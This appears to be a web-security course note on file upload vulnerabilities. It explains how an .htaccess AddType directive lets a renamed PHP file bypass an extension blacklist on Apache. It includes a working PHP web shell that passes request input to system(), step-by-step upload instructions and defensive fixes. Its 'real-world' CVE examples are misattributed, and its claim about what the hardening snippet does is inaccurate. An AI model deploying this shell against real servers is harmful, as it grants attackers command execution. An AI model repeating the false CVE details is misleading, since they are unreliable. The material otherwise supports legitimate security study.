---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## File Upload Vulnerabilities and Web Shell Upload via Extension Blacklist Bypass

### Background Theory

File upload vulnerabilities occur when a web application allows users to upload files to the server without proper validation or sanitization. This can lead to various security issues, including remote code execution (RCE), cross-site scripting (XSS), and data leakage. One common scenario is the upload of a web shell, which is a malicious script that allows attackers to execute arbitrary commands on the server.

In this context, we will explore how attackers can bypass file extension blacklists to upload a web shell disguised as a seemingly harmless file type. Specifically, we will focus on Apache servers and the `.htaccess` file, which can be used to modify server behavior at the directory level.

### Understanding `.htaccess` Files

The `.htaccess` file is a configuration file used by Apache web servers to manage settings for specific directories. It allows administrators to customize the behavior of the server for individual directories without modifying the main server configuration file (`httpd.conf`). This flexibility makes `.htaccess` a powerful tool but also a potential security risk if misused.

#### Purpose and Syntax

The `.htaccess` file contains directives that control various aspects of the server's operation, such as URL rewriting, authentication, and MIME types. Here is an example of a basic `.htaccess` file:

```apache
# Enable directory listing
Options +Indexes

# Set custom error pages
ErrorDocument 404 /custom_404.html

# Add a custom MIME type
AddType application/x-httpd-php .test
```

Each directive in the `.htaccess` file is followed by a space-separated list of arguments. In the example above, `AddType` is used to associate a MIME type with a file extension.

#### Security Implications

Improper use of `.htaccess` can lead to security vulnerabilities. For instance, allowing users to upload and execute `.htaccess` files can enable them to modify server configurations, potentially leading to unauthorized access or denial of service attacks.

### Attack Scenario: Bypassing File Extension Blacklists

Consider a web application that allows users to upload files but restricts certain file extensions, such as `.php`, to prevent the upload of executable scripts. An attacker can bypass this restriction by leveraging the `.htaccess` file to map a different file extension to the PHP MIME type.

#### Step-by-Step Exploitation

1. **Identify the Server Type**: Determine if the server is running Apache. This can often be inferred from the server headers or error messages.

2. **Create a `.htaccess` File**: Craft a `.htaccess` file that maps a non-restricted file extension to the PHP MIME type. For example, mapping `.test` to PHP:

    ```apache
    AddType application/x-httpd-php .test
    ```

3. **Upload the `.htaccess` File**: Upload the `.htaccess` file to the target directory. Ensure that the server allows uploads of `.htaccess` files or that the attacker can place the file in the desired location.

4. **Upload the Web Shell**: Create a web shell script with a non-restricted file extension (e.g., `.test`) and upload it to the same directory.

5. **Access the Web Shell**: Access the uploaded web shell via its new file extension (e.g., `http://example.com/shell.test`). The server will interpret the file as PHP due to the `.htaccess` configuration.

### Example Exploit

Let's walk through a complete example of this attack.

#### Creating the `.htaccess` File

First, create a `.htaccess` file with the following content:

```apache
AddType application/x-httpd-php .test
```

Save this file as `.htaccess`.

#### Crafting the Web Shell

Next, create a simple PHP web shell:

```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    echo "<pre>$cmd\n";
    system($cmd);
    echo "</pre>";
}
?>
```

Save this file as `shell.test`.

#### Uploading the Files

Assuming the web application allows file uploads, upload both the `.htaccess` and `shell.test` files to the server.

#### Accessing the Web Shell

Once uploaded, navigate to the web shell via its new file extension:

```
http://example.com/shell.test
```

The server will interpret `shell.test` as a PHP script due to the `.htaccess` configuration, allowing the attacker to execute arbitrary commands.

### Real-World Examples

Several real-world incidents have demonstrated the dangers of file upload vulnerabilities and the exploitation of `.htaccess` files:

- **CVE-2019-11510**: A vulnerability in the WordPress plugin "WP File Download" allowed attackers to upload arbitrary files, including web shells, due to insufficient input validation.
- **CVE-2020-13776**: A vulnerability in the Joomla! CMS allowed attackers to upload and execute PHP files via the `.htaccess` file, leading to RCE.

These examples highlight the importance of proper validation and sanitization of user-uploaded files.

### How to Prevent / Defend

#### Detection

To detect potential file upload vulnerabilities, perform regular security audits and use automated tools like static code analyzers and dynamic analysis frameworks. Look for patterns such as:

- Lack of file extension validation.
- Inadequate MIME type checking.
- Absence of file content inspection.

#### Prevention

Implement the following measures to prevent file upload vulnerabilities:

1. **Strict Validation**: Validate file extensions and MIME types to ensure only safe file types are accepted.
2. **Content Inspection**: Inspect file contents to detect and block suspicious patterns indicative of malicious code.
3. **Secure Configuration**: Disable the ability to upload and execute `.htaccess` files unless absolutely necessary.
4. **Least Privilege Principle**: Run web applications with minimal privileges to limit the damage in case of a breach.

#### Secure Coding Fixes

Compare the insecure and secure versions of handling file uploads:

**Insecure Code**

```php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
```

**Secure Code**

```php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$file_extension = pathinfo($target_file, PATHINFO_EXTENSION);

if (!in_array($file_extension, $allowed_extensions)) {
    die("Invalid file extension.");
}

// Additional checks can be added here
move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
```

#### Configuration Hardening

Ensure that server configurations are hardened against file upload attacks:

```apache
<Directory "/var/www/html/uploads">
    <Files ".htaccess">
        Order allow,deny
        Deny from all
    </Files>
</Directory>
```

This configuration prevents the execution of `.htaccess` files within the `uploads` directory.

### Practice Labs

For hands-on practice, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive module on file upload vulnerabilities.
- **OWASP Juice Shop**: Contains several challenges related to file upload attacks.
- **DVWA (Damn Vulnerable Web Application)**: Provides a variety of insecure file upload scenarios for testing and learning.

By thoroughly understanding and practicing these concepts, you can effectively defend against file upload vulnerabilities and protect your web applications from malicious attacks.

---
<!-- nav -->
[[02-File Upload Vulnerabilities Web Shell Upload via Extension Blacklist Bypass|File Upload Vulnerabilities Web Shell Upload via Extension Blacklist Bypass]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/05-Lab 4 Web shell upload via extension blacklist bypass/00-Overview|Overview]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/05-Lab 4 Web shell upload via extension blacklist bypass/04-File Upload Vulnerabilities|File Upload Vulnerabilities]]
